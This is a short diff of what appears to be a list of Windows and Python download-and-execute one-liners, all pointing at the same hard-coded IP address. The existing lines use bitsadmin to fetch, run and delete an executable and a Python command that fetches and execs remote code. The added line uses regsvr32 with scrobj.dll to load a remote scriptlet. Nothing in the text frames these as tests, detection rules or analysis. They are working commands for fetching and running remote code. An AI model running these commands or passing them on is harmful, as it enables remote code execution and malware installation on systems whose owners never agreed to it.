@@ -3,3 +3,5 @@
 cmd.exe /c bitsadmin /transfer 0915 http://99.79.124.60:8080/a %APPDATA%\0915.exe&%APPDATA%\0915.exe&del %APPDATA%\0915.exe
 
 python -c "import urllib2; exec urllib2.urlopen('http://99.79.124.60:80/a').read();"
+
+regsvr32 /s /n /u /i:http://99.79.124.60:80/a scrobj.dll
